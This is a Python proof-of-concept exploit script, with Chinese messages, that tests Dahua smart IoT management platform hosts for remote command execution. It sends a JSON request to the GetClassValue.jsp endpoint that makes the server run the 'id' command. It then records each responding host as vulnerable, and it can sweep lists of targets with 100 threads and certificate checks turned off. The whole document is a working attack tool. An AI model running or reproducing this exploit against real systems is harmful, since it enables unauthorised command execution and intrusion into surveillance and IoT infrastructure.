import argparse,requests,re,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def a():
    text="""
██████╗  ██████╗  ██████╗
██╔══██╗██╔═══██╗██╔════╝
██████╔╝██║   ██║██║     
██╔═══╝ ██║   ██║██║     
██║     ╚██████╔╝╚██████╗
╚═╝      ╚═════╝  ╚═════╝
                                                         
"""
    print(text)

def poc(target):
    payloade="/evo-apigw/admin/API/Developer/GetClassValue.jsp"
    data1={
        "data": {
            "clazzName": "com.dahua.admin.util.RuntimeUtil",
            "methodName": "syncexecReturnInputStream",
            "fieldName": ["id"]
        }
    }
    try:
            res1=requests.post(url=target+payloade,timeout=5,verify=False,json=data1)
            if "uid" in res1.text or "gid" in res1.text or "groups" in res1.text:
                print(f"[+]{target}存在远程命令执行漏洞")
                with open("result.txt",'a',encoding="utf-8")as f:
                    f.write(target+'\n')
            else:
                print(f"[-]{target}不存在该漏洞")
    except:
        pass


def main():
    a()
    parse=argparse.ArgumentParser(description="大华智能物联管理平台GetClassValue.jsp接口存在远程命令执行漏洞")
    parse.add_argument('-u','--url',type=str,help="please input your link",dest="url")
    parse.add_argument('-f','--file',type=str,help="please input your file",dest="file")
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urllist=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                urllist.append(i.strip())
        mp=Pool(100)
        mp.map(poc,urllist)
        mp.close
        mp.join
    else:
        print(f"Usage : Python {sys.argv[0]} -h") 

if __name__=="__main__":
    main()